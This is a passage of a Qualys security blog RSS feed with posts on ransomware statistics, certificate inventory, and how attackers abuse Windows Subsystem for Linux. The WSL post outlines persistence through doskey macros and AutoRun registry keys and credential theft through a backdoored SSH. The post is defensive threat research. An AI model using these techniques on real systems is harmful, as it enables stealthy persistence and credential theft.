<div class="wp-block-button is-style-fill" style="margin: 0 auto 1em; text-align: center;"><a class="wp-block-button__link has-white-color has-text-color has-background" href="https://www.qualys.com/forms/ransomware/" style="background-color:#ed2e26">Try it Now</a></div>



<hr class="wp-block-separator is-style-wide"/>
]]></content:encoded>
      <wfw:commentRss>https://blog.qualys.com/vulnerabilities-threat-research/2022/05/04/ransomware-insights-from-the-fbis-2021-internet-crime-report/feed</wfw:commentRss>
      <slash:comments>0</slash:comments>
      <authorTitle><![CDATA[Sr. Product Manager, Secure Enterprise Mobility, Qualys]]></authorTitle>
      <authorAvatar><![CDATA[https://secure.gravatar.com/avatar/f78aa4afef0cc9a5de087ea4207456aa?s=192&d=mm&r=g]]></authorAvatar>
      <authorPosts><![CDATA[https://blog.qualys.com/author/sahirrao]]></authorPosts>
      <postCategory>
        <name><![CDATA[Vulnerabilities and Threat Research]]></name>
        <link><![CDATA[https://blog.qualys.com/category/vulnerabilities-threat-research]]></link>
      </postCategory>
      <customExcerpt><![CDATA[
<p><em>The FBI has published its annual report on Internet crime. Qualys has analyzed its trends and statistics. In this post, we review our findings, especially with regards to the prevalence of Ransomware, and our recommendations for actions that enterprises should take to mitigate their risk.</em></p>



<p>Every year the U.S. Federal Bureau of Investigation publishes <a href="https://www.ic3.gov/Media/PDF/AnnualReport/2021_IC3Report.pdf">an Internet crime report</a> which summarizes its insights on trends and threats from cybercriminals based on all cybercrimes reported to the FBI by the American public. This annual report provides fascinating insights into the threat landscape, key trends, statistics on types of crimes, the real losses resulting from them, and perhaps most importantly, key insights into how cybercriminals operate so that we can better prepare to guard against them.</p>



<p>For 2021 the FBI reported 5 key threats:</p>



<ol><li>Business Email Compromise (BEC)</li><li>Confidence Fraud / Romance Scams</li><li>Cryptocurrency</li><li>Ransomware</li><li>Tech Support Fraud</li></ol>



<p>Of these threats, only ransomware complaints continue to rise. Ransomware reports increased by almost 51% compared to 2020.</p>



<p>These complaints resulted in a total of $50 million in losses in 2021, compared to $30 million in 2020—a 66% rise in total losses. Ransomware attacks hit more than <a href="https://www.zdnet.com/article/more-than-290-enterprises-hit-by-6-ransomware-groups-in-2021/">290 enterprises in 2021</a>, including major organizations like <a href="https://www.bbc.com/news/business-57178503">Colonial Pipeline</a>, <a href="https://cybersecurityworks.com/blog/ransomware/csw-analysis-accenture-attacked-by-lockbit-2-0-ransomware.html">Accenture</a>, <a href="https://www.bleepingcomputer.com/news/security/computer-giant-acer-hit-by-50-million-ransomware-attack/">Acer</a>, and <a href="https://illinois.touro.edu/news/the-10-biggest-ransomware-attacks-of-2021.php">others</a>.</p>



]]></customExcerpt>
    </item>
    <item>
      <title>Assessing Certificate Risk with Qualys VMDR</title>
      <link>https://blog.qualys.com/product-tech/2022/04/21/assessing-certificate-risk-with-qualys-vmdr</link>
      <comments>https://blog.qualys.com/product-tech/2022/04/21/assessing-certificate-risk-with-qualys-vmdr#respond</comments>
      <dc:creator><![CDATA[Ramesh Ramachandran]]></dc:creator>
      <pubDate>Thu, 21 Apr 2022 18:02:08 +0000</pubDate>
      <category><![CDATA[Product and Tech]]></category>
      <guid isPermaLink="false">https://blog.qualys.com/?p=29872</guid>
      <description><![CDATA[Digital certificates and SSL are everywhere. However, managing an accurate inventory of all current certificates in use across your enterprise is an ongoing challenge. This blog examines the scale of the problem, the shortcomings of some popular certificate tracking methods, and how Qualys VMDR’s CertView offering addresses both. When you connect to your bank, you [&#8230;]]]></description>
      <content:encoded><![CDATA[
<p><em>Digital certificates and SSL are everywhere. However, managing an accurate inventory of all current certificates in use across your enterprise is an ongoing challenge. This blog examines the scale of the problem, the shortcomings of some popular certificate tracking methods, and how Qualys VMDR’s CertView offering addresses both.</em></p>



<p>When you connect to your bank, you are using SSL. When you connect to a VPN, you are using SSL. When you connect to social media networks like Facebook and LinkedIn, you are using SSL. When you connect to public clouds like AWS or Azure… well you get the idea.</p>



<p>When applications talk to each other over the Internet or the Intranet, they use SSL to communicate, authenticate, and encrypt data between the channels.</p>



<p>Every time you visit a website with a URL that begins “https” or displays the little padlock icon, that means the site’s security has been verified by a certificate authority (CA). On the other hand, websites that are “not secure” either have not been validated by a CA or their validation has expired.</p>



<p>Given the critical role that certificates play in securing our digital world, enterprises large and small should do everything possible to manage them properly. This includes collecting and maintaining an accurate certificate inventory, making sure that certificates are adequately protected from theft, and most importantly, making sure that they don’t expire.</p>



<p>Let’s look at some of the risks from unmanaged certificates.</p>



<h3>Unmanaged Certificates Pose Security Risks</h3>



<p>A certificate authority (CA) is a trusted organization that issues digital certificates for websites and other entities. CAs validate a website’s domain and ownership (depending on the type of certificate), and issue TLS/SSL certificates that are trusted by web browsers.</p>



<p>Most organizations rely on SSL and certificates to protect their business. A few years ago, <a href="https://securityboulevard.com/2019/01/is-your-ssl-traffic-hiding-attacks/">Gartner’s research concluded</a> that 80% of network attacks would use SSL by the year 2022. Just three years ago this number stood at 50%.</p>



<p>But many organizations don’t have any visibility into their certificates. They don’t know where they are. They don’t know how many there are. They don’t know what purpose they serve. Certificate ownership information is typically incomplete or missing entirely. These conditions create unnecessary security risk.</p>



<span id="more-29872"></span>



<p>Not having an accurate certificate inventory is a concern because many bad things hide in encrypted traffic. Encryption can hide the delivery of malicious payloads, things like ransomware and trojans. Encryption also hides the malware’s call back to its command-and-control center as well as any data that is being exfiltrated from the victim’s system.</p>



<p>What is unknown cannot be managed. These unknowns can result in unplanned outages. For every unplanned outage caused by an expired certificate, there are surely many more near-misses. Most organizations have a policy about which CAs should be used. But without active oversight, security teams have no way of knowing how many certificates are coming from unapproved CAs.</p>



<p>For example, DevOps teams often use free or unapproved CAs. Why? Because they can’t wait days for infosec teams to get them a certificate. This means that when auditors enforce risk mitigation processes or when you’re out of compliance, you can’t fix those issues because you don’t know where these non-compliant certificates are configured or used.</p>



<h3>State of Certificate Security, by the Numbers</h3>



<p>Qualys performs billions of security scans for our customers. In addition to looking for vulnerabilities and control failures, we also monitor the health of digital certificates and their underlying SSL/TLS configurations.</p>



<p>Recently we analyzed our customer knowledgebase anonymously, to come up with an aggregate set of insights into the state of certificate risk across enterprises worldwide.</p>



<p>Here’s what we found:</p>



<ul><li>Qualys analyzed over <strong>3 million</strong> certificates in inventory.&nbsp;&nbsp;</li><li>More than <strong>7%</strong> of the certificates have already expired and nearly <strong>21%</strong> of certificates are expiring in the next 90 days. Expired certificates are one of the primary reasons for business outages.&nbsp;&nbsp;</li><li><a href="https://f.hubspotusercontent40.net/hubfs/408597/2022-content/reports/state-of-machine-identity-management-keyfactor-ponemon-2022.pdf" target="_blank" rel="noreferrer noopener">A recent study by the Ponemon Institute</a> found that the average Global 5000 company spends about <strong>$15M</strong> to recover from the loss of business due to a significant outage caused by an expired certificate. This includes remediation costs, loss of productivity, loss of revenues, and brand damage. Instagram, Google, Microsoft, and LinkedIn have all suffered outages blamed on expired certificates.&nbsp;</li><li>In addition, Ponemon reported the average Global 5000 company spends around <strong>$25M</strong> on audit and compliance remediation costs during recovery.&nbsp;&nbsp;</li><li>Qualys found that approximately <strong>9%</strong> of websites have inadequate security simply based on the grade of the current certificate, which we assess using the <a href="https://www.ssllabs.com/projects/rating-guide/index.html" target="_blank" rel="noreferrer noopener">Qualys SSL Labs rating</a>.&nbsp;&nbsp;</li><li>Inadequate security for validating digital certificates is primarily due to one of four factors: a self-signed certificate, an untrusted certificate authority, expired certificates that were not renewed, or usage of older protocols such as SSL v3 or TLS1.0/TLS1.1.&nbsp;&nbsp;</li><li>Among sites with expired certificates, <strong>48%</strong> were still using TLS1.2, <strong>43%</strong> were using TLS1.1, and RC4-enabled accounted for <strong>12%</strong>. Best practices dictate that servers should be configured to support the latest protocol versions to ensure you are using the strongest algorithms and chippers. It’s equally important to disable older protocol versions.&nbsp;&nbsp;</li><li>Most browsers have officially announced that they will no longer support TLS1.0/TLS1.1, so it’s time to migrate to higher encryption methods like TLS1.2/TLS1.3.&nbsp;</li><li>Usage of insecure encryptions methods like SSL v3 and TLS1.0/TLS1.1 leave your sites vulnerable to hacks and attacks. Threat actors can use publicly available exploit techniques to leave encrypted connections open to man-In-the-middle and other types of cyberattacks.&nbsp;&nbsp;</li><li>The number of stolen digital certificates has rapidly increased over the years and are sold in marketplaces on the Dark Web.&nbsp;&nbsp;</li></ul>



<p>This analysis reveals that enterprises can do a better job at managing their digital certificate security. Vulnerabilities and control failures are still lurking, and every organization can benefit from a more thorough vulnerability and compliance assessment of its certificate risk.</p>



<h3>Certificate Tracking Alternatives Fall Short</h3>



<p>Some enterprise security teams track their certificates manually, using a calendar or spreadsheets. This is better than no tracking at all, but this crude method leads to complacency. The spreadsheet might track some certificates, but only if they were reported. Keeping a close watch on every detail of the SSL certificate, policy changes, and expiration dates is time-consuming, error-prone, and risky.&nbsp;</p>



<p>This leaves a gap, sometimes quite large, between what is tracked and what is out there waiting to be exploited. Even worse, spreadsheets can&#8217;t track the underlying TLS configuration, leaving certificate administration to a select few who understand SSL well.</p>



<p>Poor certificate management can lead to service downtime or display of error messages that could destroy customer trust in the organization’s data security (or lack thereof), and in extreme cases even result in security breaches.</p>



<p>There are alternatives to the spreadsheet, but these certificate tracking options have their own challenges. Most of these alternatives are point tools. While some do help, most are just that: tools that increase the administrative effort and total cost of ownership. Many popular certificate tracking tools are not scalable and are deployed in either operational or technology silos. Each silo deploys its own instance of the tool without each team knowing about the others or being able to leverage them. Because of the way these tools are designed, many can work only within the enterprise or only in the cloud but have a hard time working across both environments.</p>



<p>In today’s complex computing environment, the enterprise network and the cloud are inextricably linked. There are very few areas where the public cloud and enterprise networks can operate independently. Most solutions in the market are certificate-only or vulnerability-only tools. They limit visibility of your security posture across all IT infrastructure. What remains is still unknown. Often another kind of tool must be deployed to complete the scanning and analysis necessary to protect the entire enterprise.&nbsp;</p>



<p>To deal with these issues, organizations need a centralized monitoring process that automatically alerts administrators when SSL certificates are about to expire so that they can take immediate action.</p>



<h3>Certificate Inventory in Qualys VMDR using CertView</h3>



<p>Qualys VMDR, our flagship vulnerability management solution, includes <a rel="noreferrer noopener" href="https://www.qualys.com/apps/certificate-assessment/" target="_blank">Certificate View (“CertView”)</a>, which gives security teams a comprehensive view of all the SSL/TLS certificates across their enterprise and cloud-hosted assets.</p>



<p>Qualys CertView extends inventory and assessment of Internet-facing certificates to include the internal network, where an organization’s most critical data resides. It continuously discovers and monitors digital certificates across the enterprise to ensure certificates are renewed <em>before </em>they expire. This stops certificate-related outages and improves availability, across both on-premises and cloud instances.</p>



<p>Qualys CertView stops expired/expiring certificates from interrupting critical business functions and offers direct visibility on them right from the dashboard. It also prevents “wildcard” certificates, which are single public key certificates designed to be used on multiple subdomains. Instead of purchasing separate certificates for subdomains, some businesses think a single wildcard certificate is more convenient to serve all domains and subdomains across multiple servers.</p>



<p>The problem is wildcard certificates can disrupt business functions that rely on secure communications with authenticated partners and customers. Their usage can lead to a single point of failure – if the key is compromised, all servers and subdomains are at risk. If the wildcard certificate is revoked, the private key will need to be updated on all the servers.</p>



<p>Even better, Qualys CertView works in concert with <a rel="noreferrer noopener" href="https://www.ssllabs.com/index.html" target="_blank">Qualys SSL Labs,</a> a publicly available service that performs a deep analysis of web server configurations and detects common problems related to SSL certificates. Qualys SSL Labs provides grades to certificates using the standard criterion such as certificate type, protocol support, key exchange, certification authority, cipher strength, and HTTP Strict Transport Security.</p>



<p>Signup for <a rel="noreferrer noopener" href="https://www.qualys.com/certview/" target="_blank">Qualys CertView</a> – free from Qualys – to review the certificate status of all your internet-facing assets.</p>



<h3>Summary</h3>



<p>Understanding which digital certificate vulnerabilities exist in your environment is critical, but many organizations don’t have any visibility into their certificate inventory. Blind spots such as expired certificates create unnecessary security risk such as possible breaches or system outages. Current solutions such as manual tracking using spreadsheets or siloed tools miss the bigger picture of the entire enterprise’s certificate security posture.</p>



<p>Qualys VMDR with CertView closes these gaps. It helps you review the status of all digital certificates exposed to the Internet, with industry grades assigned. It provides a high-level view of expiring certificates, so you can actionably remediate certificate problems by working with trusted Certificate Authorities.</p>



]]></content:encoded>
      <wfw:commentRss>https://blog.qualys.com/product-tech/2022/04/21/assessing-certificate-risk-with-qualys-vmdr/feed</wfw:commentRss>
      <slash:comments>0</slash:comments>
      <authorTitle><![CDATA[Principal Product Manager, VMDR, Qualys]]></authorTitle>
      <authorAvatar><![CDATA[https://secure.gravatar.com/avatar/7a9bee6e0fe68a422809bf1e4d05e5da?s=192&d=mm&r=g]]></authorAvatar>
      <authorPosts><![CDATA[https://blog.qualys.com/author/rramachandran]]></authorPosts>
      <postCategory>
        <name><![CDATA[Product and Tech]]></name>
        <link><![CDATA[https://blog.qualys.com/category/product-tech]]></link>
      </postCategory>
      <customExcerpt><![CDATA[
<p><em>Digital certificates and SSL are everywhere. However, managing an accurate inventory of all current certificates in use across your enterprise is an ongoing challenge. This blog examines the scale of the problem, the shortcomings of some popular certificate tracking methods, and how Qualys VMDR’s CertView offering addresses both.</em></p>



<p>When you connect to your bank, you are using SSL. When you connect to a VPN, you are using SSL. When you connect to social media networks like Facebook and LinkedIn, you are using SSL. When you connect to public clouds like AWS or Azure… well you get the idea.</p>



<p>When applications talk to each other over the Internet or the Intranet, they use SSL to communicate, authenticate, and encrypt data between the channels.</p>



<p>Every time you visit a website with a URL that begins “https” or displays the little padlock icon, that means the site’s security has been verified by a certificate authority (CA). On the other hand, websites that are “not secure” either have not been validated by a CA or their validation has expired.</p>



<p>Given the critical role that certificates play in securing our digital world, enterprises large and small should do everything possible to manage them properly. This includes collecting and maintaining an accurate certificate inventory, making sure that certificates are adequately protected from theft, and most importantly, making sure that they don’t expire.</p>



<p>Let’s look at some of the risks from unmanaged certificates.</p>



<h3>Unmanaged Certificates Pose Security Risks</h3>



<p>A certificate authority (CA) is a trusted organization that issues digital certificates for websites and other entities. CAs validate a website’s domain and ownership (depending on the type of certificate), and issue TLS/SSL certificates that are trusted by web browsers.</p>



<p>Most organizations rely on SSL and certificates to protect their business. A few years ago, <a href="https://securityboulevard.com/2019/01/is-your-ssl-traffic-hiding-attacks/">Gartner’s research concluded</a> that 80% of network attacks would use SSL by the year 2022. Just three years ago this number stood at 50%.</p>



<p>But many organizations don’t have any visibility into their certificates. They don’t know where they are. They don’t know how many there are. They don’t know what purpose they serve. Certificate ownership information is typically incomplete or missing entirely. These conditions create unnecessary security risk.</p>



]]></customExcerpt>
    </item>
    <item>
      <title>Implications of Windows Subsystem for Linux for Adversaries &amp; Defenders (Part 2)</title>
      <link>https://blog.qualys.com/vulnerabilities-threat-research/2022/04/20/implications-of-windows-subsystem-for-linux-for-adversaries-defenders-part-2</link>
      <comments>https://blog.qualys.com/vulnerabilities-threat-research/2022/04/20/implications-of-windows-subsystem-for-linux-for-adversaries-defenders-part-2#respond</comments>
      <dc:creator><![CDATA[Akshat Pradhan]]></dc:creator>
      <pubDate>Wed, 20 Apr 2022 19:26:35 +0000</pubDate>
      <category><![CDATA[Vulnerabilities and Threat Research]]></category>
      <guid isPermaLink="false">https://blog.qualys.com/?p=29845</guid>
      <description><![CDATA[This post is the second of a multi-part blog series that explores and highlights the different risks that Windows Subsystem for Linux (WSL) poses to an enterprise IT environment. Here we examine different TTPs that abuse WSL and assess different methods to defend against such threats. ← Go to Part 1 Attack Tactics, Techniques &#38; [&#8230;]]]></description>
      <content:encoded><![CDATA[
<p><em>This post is the second of a multi-part blog series that explores and highlights the different risks that Windows Subsystem for Linux (WSL) poses to an enterprise IT environment. Here we examine different TTPs that abuse WSL and assess different methods to defend against such threats.</em></p>



<p><strong><a href="https://blog.qualys.com/vulnerabilities-threat-research/2022/03/22/implications-of-windows-subsystem-for-linux-for-adversaries-defenders-part-1">← Go to Part 1</a></strong></p>



<h3>Attack Tactics, Techniques &amp; Procedures Using Windows Subsystem for Linux</h3>



<p>In our <a href="https://blog.qualys.com/vulnerabilities-threat-research/2022/03/22/implications-of-windows-subsystem-for-linux-for-adversaries-defenders-part-1">previous blog post</a>, we provided some details about Windows Subsystem for Linux, described our test environment, and detailed how an attacker enables WSL. We then analysed an attack tactic, technique, and procedure (TTP) called Proxying Execution.</p>



<p>Here in Part 2, we will look at additional TTPs as well as various threat hunting and system hardening methods that can help defend your enterprise against these threats.</p>



<h4>TTP #2: Installing Utilities</h4>



<p>Adversaries can bypass the need for a sudo password by passing the argument -u root to wsl.exe. Therefore, installing utilities is a lot easier for them inside WSL. Thus, they can bring down and use any tool of their choice to execute or build their payloads. Additionally, they can add repositories of hacking distributions to bring down tools via the package installer (fig. 1).</p>



<p>Let’s look at one such simple example involving PowerShell.</p>



<p>Interestingly enough, PowerShell can be <a href="https://docs.microsoft.com/en-us/powershell/scripting/install/installing-powershell-on-linux?view=powershell-7.1">installed on Linux</a> (fig. 2). Moreover, it will be downloaded from Microsoft’s own repository.</p>



<span id="more-29845"></span>



<figure class="wp-block-image alignwide size-full"><img data-attachment-id="29855" data-permalink="https://blog.qualys.com/vulnerabilities-threat-research/2022/04/20/implications-of-windows-subsystem-for-linux-for-adversaries-defenders-part-2/attachment/fig-1-2" data-orig-file="https://blog.qualys.com/wp-content/uploads/2022/04/Fig.-1.png" data-orig-size="1400,1050" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="Fig.-1" data-image-description="" data-image-caption="" data-medium-file="https://blog.qualys.com/wp-content/uploads/2022/04/Fig.-1-300x225.png" data-large-file="https://blog.qualys.com/wp-content/uploads/2022/04/Fig.-1-1070x803.png" loading="lazy" width="1400" height="1050" src="https://blog.qualys.com/wp-content/uploads/2022/04/Fig.-1.png" alt="" class="wp-image-29855" srcset="https://2jws2s3y97dy39441y2lgm98-wpengine.netdna-ssl.com/wp-content/uploads/2022/04/Fig.-1.png 1400w, https://2jws2s3y97dy39441y2lgm98-wpengine.netdna-ssl.com/wp-content/uploads/2022/04/Fig.-1-300x225.png 300w, https://2jws2s3y97dy39441y2lgm98-wpengine.netdna-ssl.com/wp-content/uploads/2022/04/Fig.-1-1070x803.png 1070w, https://2jws2s3y97dy39441y2lgm98-wpengine.netdna-ssl.com/wp-content/uploads/2022/04/Fig.-1-768x576.png 768w" sizes="(max-width: 1400px) 100vw, 1400px" /><figcaption>Fig.1 Registering PowerShell repository</figcaption></figure>



<figure class="wp-block-image alignwide size-full"><img data-attachment-id="29857" data-permalink="https://blog.qualys.com/vulnerabilities-threat-research/2022/04/20/implications-of-windows-subsystem-for-linux-for-adversaries-defenders-part-2/attachment/fig-2" data-orig-file="https://blog.qualys.com/wp-content/uploads/2022/04/Fig.-2.png" data-orig-size="1121,448" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="Fig.-2" data-image-description="" data-image-caption="" data-medium-file="https://blog.qualys.com/wp-content/uploads/2022/04/Fig.-2-300x120.png" data-large-file="https://blog.qualys.com/wp-content/uploads/2022/04/Fig.-2-1070x428.png" loading="lazy" width="1121" height="448" src="https://blog.qualys.com/wp-content/uploads/2022/04/Fig.-2.png" alt="" class="wp-image-29857" srcset="https://2jws2s3y97dy39441y2lgm98-wpengine.netdna-ssl.com/wp-content/uploads/2022/04/Fig.-2.png 1121w, https://2jws2s3y97dy39441y2lgm98-wpengine.netdna-ssl.com/wp-content/uploads/2022/04/Fig.-2-300x120.png 300w, https://2jws2s3y97dy39441y2lgm98-wpengine.netdna-ssl.com/wp-content/uploads/2022/04/Fig.-2-1070x428.png 1070w, https://2jws2s3y97dy39441y2lgm98-wpengine.netdna-ssl.com/wp-content/uploads/2022/04/Fig.-2-768x307.png 768w" sizes="(max-width: 1121px) 100vw, 1121px" /><figcaption>Fig.2 Installing PowerShell</figcaption></figure>



<p>The obvious issue with this technique is that pwsh is running inside Linux and some cmdlets such as those related to CIM and WMI will not be available. However, adversaries can still use PowerShell remoting from inside WSL, or use PowerShell over SSH if they need access to windows specific cmdlets. This will also bypass PowerShell script logs. Although the true strength of this technique lies in building modular loaders residing completely inside WSL that abuse interoperability to execute Windows modules to achieve adversary goals. The loader in effect becomes completely invisible to most security solutions. Some attacks have already been <a href="https://www.trendmicro.com/vinfo/us/security/news/cybercrime-and-digital-threats/bashware-attack-targets-windows-system-for-linux-wsl">observed</a> taking advantage of precisely this fact.</p>



<p>This adds another tool in an attacker’s arsenal that cyber defences will now need to consider.</p>



<h4>TTP #3: Installing Attacker Distributions</h4>



<p>Adversaries can install distributions by either <a href="https://docs.microsoft.com/en-us/windows/wsl/use-custom-distro">importing a tar file</a> or installing it directly from the Microsoft store. Imported distributions can be any Linux flavour and need not be part of Microsoft’s official store. Adversaries can also create <a href="https://docs.microsoft.com/en-us/windows/wsl/build-custom-distro">custom Linux distribution</a> for WSL with known threats and tools.</p>



<p>A distribution can be imported via the command:</p>



<pre class="wp-block-preformatted q-code-highlighted">wsl --import &lt;Distro&gt; &lt;InstallLocation&gt; &lt;FileName&gt;</pre>



<p>The currently available distributions in the Microsoft store are shown in figure 3.</p>



<figure class="wp-block-image alignwide size-full"><img data-attachment-id="29858" data-permalink="https://blog.qualys.com/vulnerabilities-threat-research/2022/04/20/implications-of-windows-subsystem-for-linux-for-adversaries-defenders-part-2/attachment/fig-3-2" data-orig-file="https://blog.qualys.com/wp-content/uploads/2022/04/Fig.-3.png" data-orig-size="1119,269" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="Fig.-3" data-image-description="" data-image-caption="" data-medium-file="https://blog.qualys.com/wp-content/uploads/2022/04/Fig.-3-300x72.png" data-large-file="https://blog.qualys.com/wp-content/uploads/2022/04/Fig.-3-1070x257.png" loading="lazy" width="1119" height="269" src="https://blog.qualys.com/wp-content/uploads/2022/04/Fig.-3.png" alt="" class="wp-image-29858" srcset="https://2jws2s3y97dy39441y2lgm98-wpengine.netdna-ssl.com/wp-content/uploads/2022/04/Fig.-3.png 1119w, https://2jws2s3y97dy39441y2lgm98-wpengine.netdna-ssl.com/wp-content/uploads/2022/04/Fig.-3-300x72.png 300w, https://2jws2s3y97dy39441y2lgm98-wpengine.netdna-ssl.com/wp-content/uploads/2022/04/Fig.-3-1070x257.png 1070w, https://2jws2s3y97dy39441y2lgm98-wpengine.netdna-ssl.com/wp-content/uploads/2022/04/Fig.-3-768x185.png 768w" sizes="(max-width: 1119px) 100vw, 1119px" /><figcaption>Fig.3 Available Distributions in Microsoft Store</figcaption></figure>



<p>Interestingly, a popular penetration testing distribution named Kali is also available for installation from the store. Therefore, any windows machine in the environment with WSL can be potentially turned into a Kali machine. <a href="https://www.kali.org/docs/wsl/win-kex/">Kali on WSL2</a> also has a full desktop experience via Win-Kex. Microsoft has also released a <a href="https://docs.microsoft.com/en-us/windows/wsl/tutorials/gui-apps">preview</a> for WSL2 with Linux GUI application support.</p>



<h4>TTP #4: Hijack Execution Flow by Redirecting to Linux Utilities</h4>



<p><a href="https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/doskey">Doskey.exe</a> is a Windows utility that recalls command line history, edits the command line, and creates macros. Interestingly, macros take precedence over the PATH environment variable lookup and thus can be used to hijack execution flow. However, macros are instance bound. Therefore, to make them persistent across all cmd instances we need to create a macro definition file and add it to the <em>AutoRun</em> value under the keys</p>



<pre class="wp-block-preformatted q-code-highlighted">HKEY_CURRENT_USER\Software\Microsoft\Command Processor  or
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Command Processor </pre>



<p>depending on your Windows version. Macros can also be exported by using the following command:</p>



<pre class="wp-block-preformatted q-code-highlighted">doskey.exe /macros &gt; &lt;filename&gt;</pre>



<p>Redirecting execution to Linux can result in persistence via patched binaries. Let’s look at one such scenario by redirecting SSH.</p>



<p>Windows uses openSSH and <a href="https://docs.microsoft.com/en-us/windows/terminal/tutorials/ssh">the SSH client</a> for it comes preinstalled on Windows 10. Even if SSH is unavailable we can still create <em>a SSH</em> macro and redirect it to WSL (fig. 4). We can then make it persistent by exporting the macros and then making the required registry changes.</p>



<figure class="wp-block-image alignwide size-full"><img data-attachment-id="29859" data-permalink="https://blog.qualys.com/vulnerabilities-threat-research/2022/04/20/implications-of-windows-subsystem-for-linux-for-adversaries-defenders-part-2/attachment/fig-4" data-orig-file="https://blog.qualys.com/wp-content/uploads/2022/04/Fig.-4.png" data-orig-size="1117,225" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="Fig.-4" data-image-description="" data-image-caption="" data-medium-file="https://blog.qualys.com/wp-content/uploads/2022/04/Fig.-4-300x60.png" data-large-file="https://blog.qualys.com/wp-content/uploads/2022/04/Fig.-4-1070x216.png" loading="lazy" width="1117" height="225" src="https://blog.qualys.com/wp-content/uploads/2022/04/Fig.-4.png" alt="" class="wp-image-29859" srcset="https://2jws2s3y97dy39441y2lgm98-wpengine.netdna-ssl.com/wp-content/uploads/2022/04/Fig.-4.png 1117w, https://2jws2s3y97dy39441y2lgm98-wpengine.netdna-ssl.com/wp-content/uploads/2022/04/Fig.-4-300x60.png 300w, https://2jws2s3y97dy39441y2lgm98-wpengine.netdna-ssl.com/wp-content/uploads/2022/04/Fig.-4-1070x216.png 1070w, https://2jws2s3y97dy39441y2lgm98-wpengine.netdna-ssl.com/wp-content/uploads/2022/04/Fig.-4-768x155.png 768w" sizes="(max-width: 1117px) 100vw, 1117px" /><figcaption>Fig.4 Creating SSH macros to redirect to WSL SSH.</figcaption></figure>



<p>Linux has <a href="https://blogs.juniper.net/en-us/threat-research/linux-servers-hijacked-to-implant-ssh-backdoor">several SSH backdoors</a>. One such popular backdoor is the Universal SSH Backdoor that patches SSH and its related libraries to allow SSH logins with an attacker defined password. The patched SSH binary also logs usernames, passwords, and IP of all incoming and outgoing SSH requests in cleartext in log files. Therefore, every time a Windows user uses SSH to login to a remote machine his credentials are leaked and logged in WSL. Attackers can then use those credentials for lateral movement.</p>



<h3>Threat Hunting on Windows Subsystem for Linux</h3>



<p>Usage of WSL in the environment is suspicious if it’s not part of normally used development tools. Monitor for command lines involving the usage of wsl.exe and bash.exe (fig. 6, 7). Usage of DISM or PowerShell to enable WSL or virtualisation features also indicate suspicious behaviour (fig. 5).</p>



<p>Existing customers of Qualys can use the following QQL (Qualys Query Language) to identify WSL related suspicious behaviour on EDR:</p>



<pre class="wp-block-preformatted q-code-highlighted">mitre.attack.technique.id:"Q0053" </pre>



<figure class="wp-block-image alignwide size-full"><img data-attachment-id="29861" data-permalink="https://blog.qualys.com/vulnerabilities-threat-research/2022/04/20/implications-of-windows-subsystem-for-linux-for-adversaries-defenders-part-2/attachment/fig-5" data-orig-file="https://blog.qualys.com/wp-content/uploads/2022/04/Fig.-5.png" data-orig-size="1271,653" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="Fig.-5" data-image-description="" data-image-caption="" data-medium-file="https://blog.qualys.com/wp-content/uploads/2022/04/Fig.-5-300x154.png" data-large-file="https://blog.qualys.com/wp-content/uploads/2022/04/Fig.-5-1070x550.png" loading="lazy" width="1271" height="653" src="https://blog.qualys.com/wp-content/uploads/2022/04/Fig.-5.png" alt="" class="wp-image-29861" srcset="https://2jws2s3y97dy39441y2lgm98-wpengine.netdna-ssl.com/wp-content/uploads/2022/04/Fig.-5.png 1271w, https://2jws2s3y97dy39441y2lgm98-wpengine.netdna-ssl.com/wp-content/uploads/2022/04/Fig.-5-300x154.png 300w, https://2jws2s3y97dy39441y2lgm98-wpengine.netdna-ssl.com/wp-content/uploads/2022/04/Fig.-5-1070x550.png 1070w, https://2jws2s3y97dy39441y2lgm98-wpengine.netdna-ssl.com/wp-content/uploads/2022/04/Fig.-5-768x395.png 768w" sizes="(max-width: 1271px) 100vw, 1271px" 